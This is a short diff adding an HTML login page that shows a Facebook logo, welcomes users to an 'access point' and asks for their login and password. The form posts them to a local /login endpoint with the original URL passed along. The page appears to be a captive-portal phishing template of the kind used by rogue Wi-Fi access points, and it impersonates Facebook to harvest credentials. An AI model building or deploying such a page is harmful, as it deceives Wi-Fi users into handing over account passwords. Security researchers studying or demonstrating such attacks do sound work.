@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="fr-FR">
+<head>
+<title>Authentication</title>
+<link rel="stylesheet" type="text/css"" href="styles.css">
+</head>
+
+<body>
+
+<div id="leftbit">
+  <img src="/facebook-logo.jpg">
+
+  <h1> Welcome to this amazing access point </h1>
+  <p> Please type your credentials here </p>
+</div>
+
+<div id="rightbit">
+  <form method="POST" action="/login?{{ orig_url }}">
+    Login:<br>
+    <input type="text" name="login">
+    <br>
+    Password:<br>
+    <input type="text" name="password">
+    <br><br>
+    <input type="submit" value="Go">
+  </form>
+</div>
+
+</body>
+</html>
